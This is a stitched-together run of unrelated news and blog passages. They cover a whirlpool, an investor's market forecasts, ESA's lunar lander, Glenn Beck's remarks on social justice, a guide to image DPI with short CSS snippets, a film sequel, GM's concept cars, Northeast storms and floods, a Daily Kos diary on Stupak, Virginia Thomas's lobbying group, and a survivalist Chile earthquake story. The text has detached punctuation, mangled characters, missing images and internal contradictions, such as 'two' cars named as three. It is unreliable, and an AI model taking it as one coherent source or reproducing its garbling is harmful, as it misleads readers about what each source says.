( Other smaller nearby whirlpools are now known as “ piglets . ” )
The whirlpool is caused by the enormous tides and bathymetry of the ocean floor in the area , and while it is one of the largest in the world with a diameter of around 250 feet , however the speed of its vortex does not come close to being one of the fastest .
The water turbulence , while rarely a danger to larger boats , can be dangerous to man powered craft and exhibits some strange water phenomena , such as standing waves , “ boils , ” “ spouts , ” “ troughs , ” “ dishes , ” and “ holes . ”
Son of Texas and financial seer , John Mauldin , believes the stock market could shed 40 % in the near future ( SPX ) .
John is the president of Millennium Wave Advisors , LLC , a Dallas , Texas based investment advisor , with $ 600 million in assets under management .
John worries that the velocity of money , an indicator of how many times a dollar is reused in the economy , is collapsing .
This ratio , which is defined by the GDP divided by the money supply , bottomed at 1.15 in 1946 .
It then reached a mean of 1.65 in the fifties , sixties , and seventies , and peaked at a breathtaking 2.2 times in 1997 , near the top of the Dotcom bubble .
It has been retreating ever since , has recently accelerated down to the 100 year mean , but still has much farther to fall to get to the bottom of the 100 year range .
The collapse of velocity signals the end of a 50 year super cycle in lending .
For you and I , this means lower economic growth for perhaps another decade .
It is partly the result of banks getting generous funding from the Treasury , and then sitting on it .
The bucks simply stop there .
It suggests that no matter how much money the government pumps into the economy , it might as well be pushing on a wet noodle .
The gold bugs have got it all wrong , simply focusing on money supply growth and expecting hyperinflation .
A lot of money can sit and go nowhere .
The inflation will come back with a vengeance when the economy revives and banks finally resume lending .
With so much new money being created in the last two years , the chances of the Fed being able to head this off are close to nil .
Similarly , the bond vigilantes may have to wait a couple of years for their big move down in the 30 year Treasury bond ( TBT ) .
When the bond markets call “ times up , ” the US will be forced to embark on some highly deflationary spending cuts .
If this happens during a recession , it could be a disaster .
John thinks there will be a substantial slowdown in growth in Q3 and Q4 .
With anticipated federal tax increases of 2 % of GDP in 2011 added to a further 1 % in state tax hikes , the recovery will be strangled in its crib .
That ’s when the risk of a double dip recession explodes .
Over 3 - 4 years higher taxes could add up to a burdensome 9 % drag on GDP .
John says that emerging markets ( EEM ) will decouple from the US and keep powering up , as this is where the real economic growth is ( EEM ) .
Japan is “ a bug in search of a windshield . ”
With savings rates falling and deficit spending soaring , it may only have a couple of years left .
John has been a gold bull since 2002 ( GLD ) , when it was below $ 300 / ounce , and is n’t backing off from that position , but prefers to own it against Euros at this point .
He thinks the entire premise for the existence of the European currency ( XEU ) is questionable , and sees it eventually moving to parity against the dollar .
John does n’t manage money directly himself , but outsources assets with market timers employing a number of different models .
One firm he has particular success with is CMG in Philadelphia ( CMGTX ) .
He really only selects individual stocks in the biotech area , which he thinks have the potential to develop into a bubble , and has a variety of small cap and microcap holdings .
Not pulling any punches , John said that the Republican leadership of the last congress was “ criminally incompetent ” in the way they unnecessarily squandered surpluses and spent their way into oblivion , leaving us without dry powder to fight the current crisis .
John has an incredibly diverse past , which includes a degree from Rice University , a stint at divinity school , and time spent running a check printing company which led him into newsletters .
John then rose to the top of the American Bureau of Economic Research , and entered the fund management business in the late eighties .

Fly us to the Moon … south pole to be precise
31/03/2010 1694 views 1 likes
The south polar region of the Moon , with dark craters and high ridges , is a world away from the relatively smooth terrain visited by Apollo astronauts four decades ago .
This rugged moonscape is the target for Europe ’s next leap into space .
The possible deposits of water ice , heavily cratered terrain and long periods of sunlight make the lunar south pole and areas around it extremely interesting for explorers and scientists .
It is therefore a prime target for future human missions to the Moon .
Europe is now looking at a lander mission to pave the way for astronauts .
This precursor would be the first European Moonlander and the first to visit the south polar region .
ESA is now asking industry to submit proposals for this Lunar Lander mission .
Preparing for human exploration Aldrin 's lunar bootprint ESA ’s Lunar Lander would pave the way for future human exploration on the Moon .
There are two core goals .
The first requires that it uses the latest navigation technology to fly a precise course from lunar orbit to the surface and touch down safely and accurately .
On the way down , it must image the surface and recognise dangerous features by itself , using its own ‘ intelligence ’ .
Then the Lander shall investigate this unique region with a suite of instruments .
It will investigate the properties and possible health effects of radiation and lunar dust on future astronauts , and it will examine the soil for signs of resources that could be used by human explorers .
Europe ’s vision : a leader in exploration Lunar Lander concept from OHB - System AG Several European industrial teams have already assessed the various mission options and designs .
The next step is ‘ Phase - B1 ’ , which will mature the mission and spacecraft design and examine in detail the demands of landing and working at specific southern sites .
This 18 - month phase will begin this summer , taking the Lunar Lander from a design concept to hardware reality .
The goal is for launch by the end of this decade .
Involving European researchers and industry is crucial for defining the detailed mission objectives and identifying instruments to address them .
For instance , a request for information in 2009 produced more than 200 responses .
Information session on Lunar Lander Lunar Lander concept from Astrium GmbH
As part of the process of involving European researchers and industry in the project , an information day will be held at ESA ’s space research and technology centre ( ESTEC ) in the Netherlands on 14 April .
The day is aimed at those who responded to the 2009 request and will include an update on the mission outline , mission objectives and the model payload to be used for Phase - B1 .
Further information on the information day can be obtained by contacting explorationcall@esa.int
BECK DOUBLES DOWN ON OPPOSITION TO ‘ SOCIAL JUSTICE ’….
This week , on his radio show , right - wing host Glenn Beck raised a few eyebrows when he condemned churches that take “ social justice ” seriously .
“ I beg you , look for the words ‘ social justice ’ or ‘ economic justice ’ on your church web site , ” Beck urged his audience .
“ If you find it , run as fast as you can .
Social justice and economic justice , they are code words .
Now , am I advising people to leave their church ?
Yes ! ”
Today , Beck returned to the subject , insisting that the notion of social justice is “ a perversion of the Gospel , ” and “ not what Jesus would say . ”
He was n’t kidding .
He went on to say that Americans should be skeptical of religious leaders who are “ basing their religion on social justice , ” and explained his fear that concern for social justice is a problem “ infecting all ” faith traditions .
Beck ’s condemnations are n’t going over well in some faith communities .
The Rev. Jim Wallis , a prominent evangelical figure and president of the Sojourners network , argued yesterday , “ I do n’t know if Beck is just strange , just trying to be controversial , or just trying to make money .
But in any case , what he has said attacks the very heart of our Christian faith , and Christians should no longer watch his show . ”
It ’s strange enough to hear the deranged media personality share his bizarre thoughts on domestic policy , foreign policy , history , constitutional law , and economics — subjects he knows nothing about .
But we now see Beck arguing , more than once , that the central tenet of most Christian churches is a secret plot that should drive the faithful from their congregations .
We ’re well past the shark - jumping moment with this self - described clown , but I ca n’t help but wonder if this is the kind of lunacy that might actually cost him some fans .
The size of an image in a website layout is important .
From proper alignment to getting just the right amount of white space , sizing photos and graphics properly beforehand is essential to creating a balanced look .
Images on the web are measured in pixels .
Yet many people go through the trouble of setting their images to 72 dots per inch ( DPI ) .
The process of sizing images for the web is often misunderstood .
The misconception about resolution in digital images bound for the web is that they must meet a certain number of dots per inch .
In print , pixels per inch and dots per inch impact the size of an image on a page .
DPI does n’t apply to layout on the web .
When someone converts an image to 72 DPI , they ’re adding an extra step with no benefit .
Web pages are measured in pixels , not real - world units such as inches .
When someone asks you for a web image that ’s , say , two inches wide , they ’re estimating how it would appear on their own monitor .
Without changing the image ’s pixel dimensions , that image would appear larger or smaller on different monitors — and would even look different on the same monitor at a different resolution setting .
Pixel Size Depends on Context
A pixel ( which is short for “ picture element ” ) is the smallest unit of measure on a grid displaying a digital image .
DPI measures how big those pixels , or dots , are when they ’re printed .
The image below is shown in different DPI s .
36 DPI
150 DPI
3,096 DPI
Download and open them in an image editor to see for yourself .
All three look the same because they were resized , not resampled .
Resizing Changes Pixel Sizes ; Resampling Changes Pixel Count
There are two ways to enlarge an image : add more pixels or make the pixels larger .
Likewise , you can reduce an image ’s size by shaving off pixels or shrinking pixels .
But shrinking and shaving are two different processes .
Shown above , resizing an image changes the size of its pixels , not its number of pixels .
We ’re not increasing or decreasing the number of pixels , only changing how large those pixels are when printed .
It ’s an inverse relationship : images with larger pixels will have a lower pixel density ( fewer pixels in the same number of inches ) when printed .
Shown above , resampling changes the image ’s size by increasing or decreasing its number of pixels .
Images with more pixels will contain more information and often make for richer graphics .
Web design is concerned with resampling , not resizing , because every pixel in a web page will always be the same size .
A web page that measures 800 pixels wide can accommodate images up to 800 pixels wide .
Making every pixel wider does n’t change the fact that the layout can hold only 800 of them .
You ca n’t make an image appear larger on screen by resizing its pixels because every pixel on the same screen will always be the same size .
Resizing and Resampling in Photoshop
Photoshop ’s Image Size box ( Image ‚ Üí Image Size ) controls both the resizing and resampling of images .
The “ Resample ” checkbox changes how many pixels fit into a linear inch — literally the pixels per inch .
If we turn off resampling , the only way to change the image ’s size would be to enlarge its pixels for printing .
With the resampling box left unchecked , changing the “ resolution ” box would alter the image ’s physical size when printed , but not its number of pixels .
When printed , an image would appear larger or smaller .
On a web page , it would be the same size .
An Experiment
Figuring out whether DPI matters in web layouts can be done by a little experiment .
If we alter an image from 300 x 100 pixels at 72 DPI to 300 x 100 pixels at 144 DPI , how many pixels would we have ?
Make an image 300 pixels wide and 100 pixels tall , at 72 DPI .
.
Let ’s do some math .
How many pixels would that be ?
Now resize the image to 300 x 100 pixels at 144 DPI .
.
Let ’s do some more math .
How many pixels is that ?
The answers are :
300 x 100 = 30,000
300 x 100 is still 30,000
Pixels per Inch on Screen
The number of pixels per inch is still relevant online , but DPI settings do not affect how an image is displayed .
Computer monitors can be physically measured in inches , and each displays a certain number of pixels .
For example , let ’s say a 19 ″ monitor shows 1280 x 1024 pixels .
The user could change it to display 1600 x 1200 pixels , thus increasing its PPI ( i.e. adding more pixels in the same number of inches . )
The important difference in print is that you can control an image ’s pixels - per-inch .
You can try this on most modern computers .
On a Mac , go to Apple Menu ‚ Üí System Preferences , and then click on “ Displays ” to see the various resolutions at which you can set your monitor .
For Windows , right - click on the desktop and select “ Personalize , ” and then choose “ Display settings . ”
Change the screen resolution ( number of pixels ) and watch as the items on your Mac or PC desktop get larger or smaller .
Obviously , your monitor is n’t changing in size .
But if you hold a ruler to the screen , you ’ll see that the size of icons and windows is inversely proportional to the number of pixels displayed .
For example , a 13 ″ laptop , a 17 ″ CRT monitor and a 21 ″ flat - panel monitor can all present a desktop that measures 1024 x 768 pixels .
More pixels mean smaller icons ; fewer pixels mean larger icons .
More pixels in the same monitor give you a higher pixel density ; fewer pixels is lower .
The difference becomes more noticeable with other types of displays :
A digital billboard measuring 47 x 12 feet might use only 888 x 240 pixels ( about 1.6 PPI ) .
An iPhone screen today measures 2 x 3 inches and holds 320 x 480 pixels ( about 160 PPI ) .
A single PNG file measuring 100 x 100 pixels would fit on both the 888 x 240 billboard and the 320 x 480 iPhone .
But it would appear much larger on the billboard because the board ’s pixels are 100 times larger than the iPhone ’s ( 1.6 vs. 160 ) .
The illustration below shows two devices with different pixel dimensions .
The same image is being shown on two different displays .
The differences in each display ’s PPI make the image on the right - hand display appear larger , even though it has fewer pixels overall .
You can test this yourself :
Create a JPG that measures 960 x 100 pixels , at any pixel density .
Measure it by hand with a ruler .
Look at the same image on a computer with a larger or smaller monitor .
For example , if you created the image on a 20 ″ screen , test it on a 13 ″ laptop .
Print the same number of pixels at different pixel densities to see different sizes on paper .
The result is that this one image would have the same number of pixels but a different width in inches .
The website layout would appear in different sizes , despite identical code .
( For an extreme case , look at the entire page on an iPhone ; 960 pixels is fitted to three inches or less , without the file itself being changed . )
Why 72 is significant
Many file formats , including JPG , TIF and PSD , store an image ’s pixel density setting .
If you save a JPG at 200 pixels / inch , it will remain at 200 .
Other formats , including GIF and PNG , discard pixel density .
If you save a 200 DPI image as a PNG , it wo n’t save that DPI at all .
Many image editors , including Adobe Photoshop , assume that an image is 72 DPI if the information is not stored .
( Note : Photoshop ’s “ Save for Web ” feature discards unnecessary print information , including pixels / inch from its Image Size dialog box . )
Seventy - two is a magic number in printing and typography .
In 1737 Pierre Fournier used units called ciceros to measure type .
Six ciceros were 0.998 inches .
Around 1770 , François - Ambroise Didot used slightly larger ciceros to fit the standard French “ foot . ”
Didot ’s pica was 0.1776 inches long and divided evenly into 12 increments .
Today we call them points .
In 1886 , the American Point System established a “ pica ” as being 0.166 inches .
Six of these are 0.996 inches .
None of the units ever strayed far from 12 points per pica : 6 picas per inch = 72 points per inch .
It was an important standard by 1984 , when Apple prepared to introduce the first Macintosh computer .
The Mac ’s interface was designed to help people relate the computer to the physical world .
Software engineers used the metaphor of a desk to describe the arcane workings of a computer , right down to “ paper , ” “ folder ” and “ trash ” icons .
Each pixel on the original Mac ’s 9 - inch ( diagonal ) and 512 x 342 pixel screen measured exactly 1 x 1 point .
Hold a ruler to the glass , and you ’d see that 72 pixels would actually fill 1 inch .
This way , if you printed an image or piece of text and held it next to the screen , both the image and hard copy would be the same size .
But early digital pictures were clunky and jagged .
As screen technology and memory improved , computers were able to display more pixels on the same size monitor .
Matching a print - out to the screen became even less certain when raster and vector apps allowed users to zoom in and examine pixels closely .
By the mid-1990s , Microsoft Windows could switch between 72 and 96 pixels per inch on screen .
This made smaller font sizes more legible because more pixels were available per point size .
Today , designers and clients alike understand that the sizes of items on the screen are not absolute .
Differences in screen size and zoom functionality are commonplace .
But 72 is still the default .
Higher Screen PPI Means Better Legibility at Smaller Point Sizes
Screens with higher PPI are great for legibility .
More pixels per inch make letterforms easier to read .
It also means that images and text must be larger ( in pixels ) to be readable .
The text sample above has been resized from two different screen PPI settings .
The top row has smaller pixels ( i.e. a higher PPI on screen ) , so 8 points is the smallest legible font size .
Text in the bottom row is barely legible below 10 points .
As PC monitors surpassed the pixel density of Mac monitors in the mid-1990s , websites built on Windows boasted smaller font sizes , much to the dismay of Mac users .
Today , screens for both platforms enjoy pixel densities high enough to make the differences moot .
Elastic Web Images With Modern Browsers
We know now that DPI alone does n’t change an image ’s size on the web , and we have no control over which device an image is displayed on .
So , are an image ’s pixel dimensions the only thing that matters ?
Yes … for now .
Fluid - width layouts , which change according to the browser ’s size , can better accommodate a range of devices and monitors .
Modern browsers , from FireFox 3 , Safari 3 and Internet Explorer 7 and up , are better than older versions at scaling images on the fly .
The max - width CSS property forces images to fit their container but not grow past their actual size .
For example :
p { width : 25 % } /* A quarter of the content area */
img { max - width : 100 % }
p { width : 50 % } /* Half of the content area */
img { max - width : 100 % }
p { width : 75 % } /*
Three quarters of the content area */
img { max - width : 100 % }
/* No width set for the paragraph */
img { max - width : 100 % }
Here we see one 800 - pixel - wide image fit into four different - sized paragraph elements .
If the page width were flexible , resizing your browser window would expand the image — but not past its original 800 x 323 pixel dimensions .
It would never become distorted , or “ pixellated , ” from over - expansion .
Preparing images for the web means planning in pixels .
If someone asks for a 2 - inch graphic for the web , not for print , ask them , “ How big are your pixels ? ”

Universal has started the wheels moving on a sequel to the 1988 classic comedy Midnight Run .
The studio has hired Tim Dowling to write the comedy , with Robert De Niro reprising his role as Los Angeles - based bounty hunter Jack Walsh , the former Chicago cop who hunts the turncoat mob accountant played by Charles Grodin in time to collect a $ 100,000 fee .
George Gallo wrote the original .
The film is being produced by De Niro and his Tribeca Productions partner Jane Rosenthal .
It first came up when Deadline Hollywood revealed that the sequel was one of the films that WME had booked for De Niro before he returned to CAA .
No word on the plot , but Walsh will chase a new fugitive .
Charles Grodin , who retired from acting to become a broadcast journalist , wo n’t return .
Dowling ’s script work included Role Models and Just Go With It , the Sony comedy that stars Adam Sandler , Jennifer Aniston and Nicole Kidman .
Segway Car
Nowadays traffic jams is one of the big problem of urban living people and the main reason is that more and more population is shifting towards the cities and according to the auto mobile development master ‘ GM ’ more than 60 percent of the world population will come to cities by 2030 and according to some estimate about 20 billion cars will be on the roads at that time .
A very amazing concept of future cars has been provided by GM by teaming up with Personal transporter specialists Segway , in that concept three electric network vehicles have been introduced which are sixth the size of conventional cars .
While discussing about the concept Alan Taub , global VP of research and development said that “ The EN - V concept represents a major breakthrough in the research that GM has been doing to bring vehicle autonomy to life ” and further said “ The future of how we move around in urban areas like Shanghai can combine the best of personal mobility and public transit ” .
These two concept cars have been named as Jiao ( the red one ) , Xiao ( the blue one ) and Miao ( the black one ) and both of them mainly emphasize the enjoyable nature of future transportation .

Pennsylvania Closing All of Interstates 81 , 83 , 78
Blizzard Conditions Impacting Majority of the State
Harrisburg – With blizzard conditions causing impassible road conditions , Governor Edward G. Rendell is closing interstates 83 , 78 , and part of Interstate 81 beginning at 12:30 p.m. and is expecting to close additional roads as conditions deteriorate .
Interstate 81 is closed from the Maryland line to Interstate 80 .
With hazardous weather conditions in much of the state , the Governor said it is too dangerous for any motorist to be driving .
“ For your safety , do not drive , ” Governor Rendell said .
“ You will risk your life and , potentially , the lives of others if you get stuck on highways or any road .
“ The National Weather Service issued blizzard warnings for several counties in Pennsylvania and visibility is at or near zero .
Motorists must stay off interstates 81 , 83 , and 78 until my administration lifts the restriction . ”
It is important that people only call 911 in an emergency .
Do not call for any other reason .
( CNN ) --
The rain has stilled , but the water - weary Northeast was left Wednesday to deal with flooded roads and basements as it waited for the water levels to drop .
Rhode Island has been hit particularly hard .
" Looking for some positives here , the water has begun to recede , " said Rhode Island Gov. Donald Carcieri at an afternoon news conference .
He said the state has had some bad accidents but no fatalities .
It 's " really very positive and encouraging given the amount of water and the circumstances that so many of our citizens have faced , " he said .
A rainstorm formed earlier this week and soaked the Northeast on Tuesday , exacerbating the remaining effects of another major storm from two weeks ago .
Although Tuesday was a rough and rainy day for most in the region , Rhode Island appeared to fare the worst .
Is it flooding near you ?
Share photos , videos and stories
" We 're just all ready to throw the keys on the counter and walk out of the houses , " one Cranston , Rhode Island , resident said .
" It 's at that point now , you know ? "
The storm dumped 8.75 inches of rain in East Providence , 7.6 inches in downtown Providence and 5 inches in Cranston , all in Rhode Island , said Tom Econopouly , a senior hydrologist at the Northeast River Forecast Center in Taunton , Massachusetts .
" I can turn on the jet skis and go for a ride , " one Rhode Island woman said .
" What can you do ?
Mother Nature 's winning . "
All eyes were on the Pawtuxet River , which runs through Cranston .
The river crested at 20.79 feet Wednesday , nearly 12 feet above flood stage , according to the National Oceanic and Atmospheric Administration 's Advanced Hydrometeorological Service .
The water level began a slow decline during the day but remained above 20 feet at 5 p.m. Wednesday .

" We have some historic flooding going on in places we 've never had flooding before .
We have numerous streets that are closed , and they 're telling us the worst is still yet to come , " said Cranston Police Lt. Stephen Antonucci .
Cranston Mayor Allan
Fung said the city was facing dire circumstances , even though the weather was now cooperating .
" One of my sewer pump stations just failed , so it 's some bad news for many of the residents , " he told ABC's " Good Morning America . "
He said the city was asking people to conserve water .
About 130 homes have been evacuated , many voluntarily , he said .
Schools were closed , as were some roads .
" It 's some very dangerous conditions , " he told ABC .
The state shut down parts of Interstate 95 in both directions , and Carcieri said Wednesday that it was expected to remain closed Thursday morning .
Commuters will have to take alternate routes , he said .
" That means it 's going to be slow .
It 's going to be slow - going , nothing we can do about that , " he said .
Amtrak said Wednesday that it suspended the Acela Express Service from New Haven , Connecticut ; to Boston , Massachusetts , because of " high water conditions along the tracks . "
It said service east of Providence will continue to operate but that " passengers should expect delays through the area . "
Earlier in the week , President Obama extended a state of emergency for Rhode Island , freeing up federal dollars to help with relief efforts .
A spokesman for National Grid Energy Services said 12,000 to 14,000 customers were without electricity in the Cranston area , where a substation was underwater .
In Westerly , another 9,600 customers were in the dark , the spokesman said .
He told area residents to expect rotating outages throughout the night and predicted they would continue for days .
The National Grid asked customers with service to conserve power .
" Historic rain falls and flood conditions are causing power outages throughout the region .
Customers in some areas may be without power for several days , " it said .
In Connecticut , Gov. Jodi Rell said a state of emergency put in place for the storm earlier this month remains in effect .
" The relentless rain has created extremely dangerous situations , especially in eastern Connecticut , " she said Tuesday .
She announced that she has directed the Department of Public Safety to reassign all available state troopers to eastern Connecticut to assist with road closures and other emergencies .
In Yantic , Connecticut , the Yantic River set a record when it crested Tuesday at 13.6 feet -- 4.6 feet above flood stage .
Yet another record was predicted for Saxonville , Massachusetts , where the Sudbury River was expected to reach 13.4 feet Wednesday afternoon .
The flood stage is 10 feet .
Floodwaters rush through " Mystic Pizza " town
In Massachusetts , four to seven inches of rain fell in the eastern part of the state during this latest storm , said Scott MacLeod , a public information officer with the Massachusetts Emergency Management Agency in Framingham .
Most of the flooding in Massachusetts occurred in the Bay State 's southeastern corner county of Bristol , where about 200 people were evacuated , he said .
Gov. Deval Patrick has declared a state of emergency and activated the National Guard , which was prepared to assist overnight .
A handful of shelters were open , though few people were staying there .
No reports of power outages in the state were made , MacLeod said .
" It 's mainly flooding issues -- closed roads , flooded roadways and basements . "

I watched Rachel last night HOPING she would address what I pointed out .
Although she did n’t talk about the facts , she did mention Stupak and his relationship with C Street .
I was disappointed .
I was bothered that Rachel would miss the obvious and gift of an opportunity to point out that the bill does not do what Rep.
Stupak does and that in fact , it does the opposite .
I got 30 - something recs on my diary and enthusiastic support in the comments .
I was hoping that someone , somewhere would make the breakthrough .
I pimped the hell out of my diary and was disappointed that Kossacks like to say they are for action but only seem willing to take action when a headliner writes the diary .
Well Jonathan Karl and Diane Sawyer did take action at ABC World News .
They covered Rep. Stupak ’s lies in their truth squad segment last night .
I do not know why Jonathan Karl was on the same path I was yesterday .
I do n’t know who at ABC News decided to actually READ the pages of the bill that Bart Stupak cited .
But I am so grateful that SOMEONE in the press did the work they should do .
I was so relieved that SOMEONE in the press read the bill rather than taking someone ’s word for it .
But mostly , I am relieved the message is out there that Bart Stupak is WRONG .
Let me add this nugget : on Wednesday , before I read the language myself and before I wrote my diary , I watched Rep. Stupak tell Speaker Pelosi via Hardball with Tweety , that the language he said was in the bill was found on pages 33 - 44 ; but when I looked at pages 33 - 44 that was n’t correct .
So I called Rep. Stupak ’s office trying to find the correct pages .
They were terribly rude and not knowledgeable .
At the end of my " chat " with one of his staffers I said that if Stupak is willing to throw himself on the sword over this then he better get the page numbers right .
That if he wants any credibility that he and his staffers better know the correct page numbers off the top of their heads or they appear to be wrong , evasive and / or deceptive .
I got a phone message later that evening with the correct page numbers .
And the next morning , Rep. Stupak was citing the correct page numbers .
This means two things : we can get through to them if we are smarter than them and if we find the things they ca n’t argue against .
I did n’t argue about the language with them , because at the time I had n’t read it .
But I convinced them that they would n’t be taken seriously if they gave out incorrect resources .
But this also means that the best way to counter lies is to READ THE BILL .
The only way Rep. Stupak was called out was because someone READ THE BILL .
We ca n’t rely on people telling us what is and is n’t in there .
We have to do the work .
If you are curious about my diary , here ’s one last pimp .
http://www.dailykos.com/...
UPDATE :
If you could n’t watch the embedded video or read my other diary , the quick recap of THE ISSUE is this : Stupak says that the Senate bill requires insurance companies in the exchange to provide abortion coverage – NOT TRUE .
He says that every single enrollee in the exchange must pay $ 1 / month into an abortion fund – NOT TRUE .
States are allowed to exclude abortion coverage from the exchange plans .
Insurance companies are allowed to exclude abortion coverage from their plans .
There is INDIVIDUAL CHOICE in choosing a plan , if one is offered , that has an abortion coverage rider that a person then must pay a separate premium for to keep regular premiums COMPLETELY SEGREGATED from abortion coverage premiums .
The language of the bill honors federal funding laws as they exist and it ’s written to honor the law if it ever changes .
The language of pages 2069 - 2078 is ALL ABOUT KEEPING FEDERAL FUNDS ( including subsidies and tax credits ) FAR FROM abortion funding .
The ONLY exceptions are the exceptions allowed by law in the Hyde Amendment .
Simply put : if one CHOOSES to purchase Plan Q with an abortion Rider through Company A , then one pays a separate rider premium .
If one buys Plan R without an abortion Rider through Company A , then one DOES NOT pay anything toward an abortion coverage fund .
And I want to thank Catskill Julie , one more time , for motivating me to write the initial diary in the first place .
UPDATED to add Tomsank 's suggestion that we give some positive re-enforcement to ABC News by sending them our thanks for doing their job when no one else was doing it .
Perhaps we should also bombard all the networks with the kind suggestion to do the same due diligence . ;)
UPDATE :
Here is contact information for the major news sites ( minus FOX News because , well , you know ) .
Please email or send a message through the organizations web - based contact pages .
( I have created an email list below if you want to send a group email rather than one - offs ) .
I do think we should encourage ABC by thanking them and encourage the others to rise to the bar ABC set on this issue .
It is their job to being facts to light but it does n’t mean we ca n’t support them when they do and remind others that we ’re expecting it from them .

Thanks again , Tomsank , for the assist in getting media contact info .
As Virginia Thomas tells it in her soft - spoken , Midwestern cadence , the story of her involvement in the “ tea party ” movement is the tale of an average citizen in action .
“ I am an ordinary citizen from Omaha , Neb. , who just may have the chance to preserve liberty along with you and other people like you , ” she said at a recent panel discussion with tea party leaders in Washington .
Thomas went on to count herself among those energized into action by President Obama ’s “ hard - left agenda . ”
But Thomas is no ordinary activist .
She is the wife of Supreme Court Justice Clarence Thomas , and she has launched a tea - party - linked group that could test the traditional notions of political impartiality for the court .
In January , Virginia Thomas created Liberty Central Inc. , a nonprofit lobbying group whose website will organize activism around a set of conservative “ core principles , ” she said .
The group plans to issue score cards for Congress members and be involved in the November election , although Thomas would not specify how .
She said it would accept donations from various sources -- including corporations -- as allowed under campaign finance rules recently loosened by the Supreme Court .
“ I adore all the new citizen patriots who are rising up across this country , ” Thomas , who goes by Ginni , said on the panel at the Conservative Political Action Conference .
“ I have felt called to the front lines with you , with my fellow citizens , to preserve what made America great . ”
The move by Virginia Thomas , 52 , into the front lines of politics stands in marked contrast to the rarefied culture of the nation ’s highest court , which normally prizes the appearance of nonpartisanship and a distance from the fisticuffs of the politics of the day .
Justice Thomas , 61 , recently expressed sensitivity to such concerns , telling law students in Florida that he does n’t attend the State of the Union because it is “ so partisan . ”
Thomas , who was nominated by President George H.W. Bush , has been a reliable conservative vote since he joined the court in 1991 .
Experts say Virginia Thomas ’ work does n’t violate ethical rules for judges .
But Liberty Central could give rise to conflicts of interest for her husband , they said , as it tests the norms for judicial spouses .
The couple have been married since 1987 .
“ I think the American public expects the justices to be out of politics , ” said University of Texas law school professor Lucas A. “ Scot ” Powe , a court historian .
He said the expectations for spouses are far less clear .
“ I really do n’t know because we ’ve never seen it , ” Powe said .
Under judicial rules , judges must curb political activity , but a spouse is free to engage .
“ We expect the justice to make decisions uninfluenced by the political or legal preferences of his or her spouse , ” said New York University law professor Stephen Gillers , an expert on legal ethics .
Virginia Thomas declined to comment in detail about her plans for LibertyCentral.org , which she said would fully launch in May .
In a brief phone interview , she did not directly answer questions about whether she and her husband had discussed the effects her role might have on perceptions of his impartiality .
“ I do n’t involve myself in litigation .
Are you asking that because there ’s a different standard for conservatives ?
Did you ask Ed Rendell that question ? ” she said , referring to the Democratic governor of Pennsylvania , who is married to a federal appellate court judge .
Virginia Thomas has long been a passionate voice for conservative views .
She has worked for former Republican Rep. Dick Armey of Texas and for the Heritage Foundation , a conservative think tank with strong ties to the GOP .
In 2000 , while at the Heritage Foundation , she was recruiting staff for a possible George W. Bush administration as her husband was hearing the case that would decide the election .
When journalists reported her work , Thomas said she saw no conflict of interest and that she rarely discussed court matters with her husband .
“ We have our separate professional lives , ” she said at the time .
In fall 2008 , when Thomas joined Hillsdale College as an administrator , she called the school ’s Washington campus “ the safest place for me to be when it comes to conflicts . ”
Her new endeavor could signal a return from that shelter .
Although Liberty Central is a nonpartisan group , its website shows an affinity for conservative principles .
Her biography notes that Thomas is a fan of Rush Limbaugh and Mark Levin , author of “ Men in Black : How the Supreme Court is Destroying America . ”
“ She is intrigued by Glenn Beck and listening carefully , ” the bio says .
As in her appearance at the panel discussion , the website does not mention Clarence Thomas .
The judicial code of conduct does require judges to separate themselves from their spouses ’ political activity .
As a result , Marjorie Rendell , a judge on the 3rd U.S. Circuit Court of Appeals , has stayed away from political events , campaign rallies and debates in Pennsylvania .
Her husband discussed such issues in his first campaign for governor .
Since then , Judge Rendell has sought the opinion of the judiciary ’s Committee on Codes of Conduct when a case presents a possible conflict of interest involving her husband ’s political office , she said .
Law professor Gillers said that Justice Thomas , too , should be on alert for possible conflicts , particularly those involving donors to his wife ’s nonprofit .
“ There is opportunity for mischief if a company with a case before the court , or which it wants the court to accept , makes a substantial contribution to Liberty Central in the interim , ” he said .
Justice Thomas would be required to be aware of such contributions , Gillers said , adding that he believes Thomas should then disclose those facts and allow parties in the case to argue for recusal .
But it would be up to Justice Thomas to decide whether to recuse himself .
He could not be reached for comment .
As a 501 ( c ) ( 4 ) nonprofit , Liberty Central can raise unlimited amounts of corporate money and largely avoid disclosing its donors .
Because of a recent Supreme Court decision , Citizens United vs. Federal Election Commission , the group may also spend corporate money freely to advocate for or against candidates for office .
Justice Thomas was part of the 5 - 4 majority in that case .

Among the Top Trends we had forecast for 2010 was u201CNeo - Survivalism.u201D
With so many once - dependable u201CSystemsu201D taking a battering and breaking down and with the certainty that there will never be a return to u201 Cnormalu201D we foresaw the need for new types of survivalist thinking designed to cope with future emergencies .
The 8.8 - magnitude earthquake that struck Chile on February 27th put those theoretical guidelines and strategies to an acid test .
Institute Director Gerald Celente and colleague Gary Abatelli , on the last leg of a South American fact - finding mission , arrived in Santiago , Chile , on Thursday , February 25th .
Shortly after 3 a.m. Saturday , though in a 14th - floor room with all windows closed , they were awakened by the wild howling of the innumerable dogs that roam Santiago ’s streets .
In retrospect , it was a wake - up - call … a harbinger of the mega - quake that would strike minutes later .
The 5 - star Crown Plaza Hotel lurched and rocked .
Within the room the TV toppled , lamps crashed , drawers shot out of their bureaus .
Both close - combat black belts , Celente and Abatelli ’s decades of physical and psychological training would serve them well .
When All Hell Breaks L... Cody Lundin Best Price : $ 5.99 Buy New $ 2.99 ( as of 02:30 EST - Details )
Aware of Chile ’s long history of quakes , at the first tremor , Celente bolted from bed , put on his pants , slipped on his shoes , grabbed his jacket and ran for the stairwell .
The two had just one thought in mind : get out of the hotel before it collapsed .
Nothing else counted .
Personal possessions ( passports , wallets , money , watches ) became instant nonessentials .
When it comes to life and death , the only things to leave behind are everything .
During 90 seconds of violent quakes , they put into practice years of u201 Cwobble boardu201D training : the art of maintaining balance while continuing to move forward no matter what is being thrown at you .
Flying down 14 stories of convulsing , pitching stairs , in just minutes ( Celente reckons no more than three ) , they were first to reach the bottom .
Astonishingly , except for the hysterical cries of Madre de Dios coming from an escapee from a few floors above them , the stairwell was totally empty !
They would later learn , from interviews with hotel guests , that the majority froze in panic .
Some called the front desk for instructions , others waited for tour guides to direct them , a few huddled under desks , found refuge in bathtubs , or sought shelter in doorways .
We put our motto , u201CThink for yourself , u201D into action .
Luckily , though seriously damaged , the hotel stood .
Had it collapsed , those within it who were waiting to follow orders from tour guides or hotel personnel would have perished .
When survival is at stake physical , fiscal or psychological the only leader to follow is yourself .
Prepare for the worst .
If the worst does n’t happen , nothing is lost .
